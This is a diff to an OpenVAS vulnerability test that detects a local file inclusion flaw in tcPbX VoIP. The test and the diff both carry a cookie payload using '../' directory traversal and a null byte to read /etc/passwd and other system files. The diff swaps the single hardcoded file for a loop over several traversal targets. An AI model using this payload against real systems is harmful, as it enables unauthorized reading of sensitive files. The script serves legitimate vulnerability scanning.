@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tcpbx_voip_lfi_vuln.nasl 11493 2018-09-20 09:02:35Z asteins $
+# $Id: gb_tcpbx_voip_lfi_vuln.nasl 11647 2018-09-27 09:31:07Z jschulte $
 #
 # tcPbX 'tcpbx_lang' Parameter Local File Inclusion Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:tcpbx:tcpbx_voip";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809009");
-  script_version("$Revision: 11493 $");
+  script_version("$Revision: 11647 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-20 11:02:35 +0200 (Thu, 20 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 11:31:07 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
   script_name("tcPbX 'tcpbx_lang' Parameter Local File Inclusion Vulnerability");
 
@@ -64,7 +64,7 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_tcpbx_voip_remote_detect.nasl");
+  script_dependencies("gb_tcpbx_voip_remote_detect.nasl", "os_detection.nasl");
   script_mandatory_keys("tcPbX/Installed");
   script_require_ports("Services/www", 80);
   exit(0);
@@ -74,6 +74,7 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if(!iqPort = get_app_port(cpe:CPE)){
   exit(0);
@@ -81,15 +82,23 @@ if(!iqPort = get_app_port(cpe:CPE)){
 
 url = "/tcpbx/";
 
-## Condtruct crafted cookie parameter
-cookie = "tcpbx_lang=../../../../../../../../../../etc/passwd%00; PHPSESSID=7rmen68sn4op8cgkc49l86pfu4";
+files = traversal_files();
 
-if(http_vuln_check(port:iqPort, url:url, check_header:TRUE,
-   pattern:"root:.*:0:[01]:", cookie: cookie,
-   extra_check:make_list(">www.tcpbx.org", "<title>tcPbX</title>")))
-{
-  report = report_vuln_url(port:iqPort, url:url);
-  security_message(port:iqPort, data:report);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  cookie = "tcpbx_lang=../../../../../../../../../../" + file + "%00; PHPSESSID=7rmen68sn4op8cgkc49l86pfu4";
+
+  if(http_vuln_check(port:iqPort, url:url, check_header:TRUE,
+     pattern:pattern, cookie: cookie,
+     extra_check:make_list(">www.tcpbx.org", "<title>tcPbX</title>")))
+  {
+    report = report_vuln_url(port:iqPort, url:url);
+    security_message(port:iqPort, data:report);
+    exit(0);
+  }
 }
+
+exit(99);
 
